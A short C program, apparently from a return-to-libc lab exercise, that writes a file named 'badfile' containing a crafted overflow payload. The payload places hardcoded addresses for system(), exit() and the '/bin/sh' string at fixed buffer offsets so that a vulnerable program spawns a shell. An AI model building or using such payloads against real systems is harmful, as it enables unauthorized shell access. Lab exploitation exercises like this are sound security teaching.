#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[200];
  FILE *badfile;

  memset(buf, 0xaa, 200); // fill the buffer with non-zeros

  *(long *) &buf[70] = 0xbffffdbf ;   //  The address of "/bin/sh", where do we get this from?
  *(long *) &buf[66] = 0xb7d989d0 ;   //  The address of exit()
  *(long *) &buf[62] = 0xb7da4da0 ;   //  The address of system()

  badfile = fopen("./badfile", "w");
  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
